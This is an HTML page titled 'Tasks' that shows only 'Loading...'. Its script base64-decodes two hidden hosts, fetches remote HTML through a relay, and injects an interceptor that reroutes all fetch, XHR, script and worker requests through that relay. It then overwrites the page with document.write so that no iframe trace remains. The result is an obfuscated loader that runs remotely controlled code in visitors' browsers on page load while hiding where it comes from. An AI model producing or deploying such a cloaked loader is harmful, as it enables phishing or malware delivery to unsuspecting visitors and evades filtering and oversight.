<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Tasks</title>
<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
  overflow: hidden;
  background: #111;
  color: #fff;
  font-family: sans-serif;
}
#x2 {
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
</style>
</head>
<body>
<div id="x2">Loading...</div>
<script>
(function() {
  function decodeBase64(str) {
    return decodeURIComponent(escape(atob(str)));
  }

  // Base64 encoded target endpoints
  const encodedRelay = "aHR0cHM6Ly9sb2dpc3RpY2FsLXV0aWxpdGllcy52ZXJjZWwuYXBw";
  const encodedTarget = "aHR0cHM6Ly9jb3JlLWxvZ2ljLXV0aWxzLmdpdGh1Yi5pbw==";

  const relayBase = decodeBase64(encodedRelay);
  const targetOrigin = decodeBase64(encodedTarget);

  const proxyUrl = relayBase + "/api/relay?url=" + encodeURIComponent(targetOrigin);

  fetch(proxyUrl)
    .then(function(response) {
      if (!response.ok) throw new Error("fetch failed");
      return response.text();
    })
    .then(function(html) {
      const interceptor = `
      <script>
      (function() {
          const PROXY_BASE = "${relayBase}/api/relay?url=";
          const TARGET_BASE = "${targetOrigin}/";
          
          function rewrite(u) {
              if (!u || typeof u !== 'string') return u;
              if (u.startsWith('blob:') || u.startsWith('data:') || u.startsWith(PROXY_BASE)) return u;
              try {
                  const abs = new URL(u, TARGET_BASE).href;
                  return PROXY_BASE + encodeURIComponent(abs);
              } catch(e) {
                  return u;
              }
          }

          const oldFetch = window.fetch;
          window.fetch = async function(...args) {
              if (typeof args[0] === 'string') args[0] = rewrite(args[0]);
              else if (args[0] && args[0].url) args[0] = new Request(rewrite(args[0].url), args[0]);
              return oldFetch.apply(this, args);
          };

          const oldOpen = XMLHttpRequest.prototype.open;
          XMLHttpRequest.prototype.open = function(...args) {
              if (args[1]) args[1] = rewrite(args[1]);
              return oldOpen.apply(this, args);
          };

          const scriptDesc = Object.getOwnPropertyDescriptor(HTMLScriptElement.prototype, 'src');
          if (scriptDesc) {
              Object.defineProperty(HTMLScriptElement.prototype, 'src', {
                  set: function(val) { return scriptDesc.set.call(this, rewrite(val)); },
                  get: function() { return scriptDesc.get.call(this); }
              });
          }

          const oldWorker = window.Worker;
          window.Worker = function(workerUrl, options) {
              const rewritten = rewrite(workerUrl);
              if (rewritten.startsWith('blob:') || rewritten.startsWith('data:')) {
                  return new oldWorker(rewritten, options);
              }
              const blobCode = 'importScripts("' + rewritten + '");';
              const blob = new Blob([blobCode], { type: 'application/javascript' });
              return new oldWorker(URL.createObjectURL(blob), options);
          };
      })();
      <\/script>
      `;

      let processed = html;
      if (processed.toLowerCase().includes('<head>')) {
          processed = processed.replace(/<head>/i, '<head>\n' + interceptor);
      } else {
          processed = interceptor + '\n' + processed;
      }

      // Overwrites top document directly; no iframe node remains in the DOM tree
      document.open();
      document.write(processed);
      document.close();
    })
    .catch(function(err) {
      console.log("error", err);
      document.getElementById("x2").innerText = "Failed.";
    });
})();
</script>
</body>
</html>
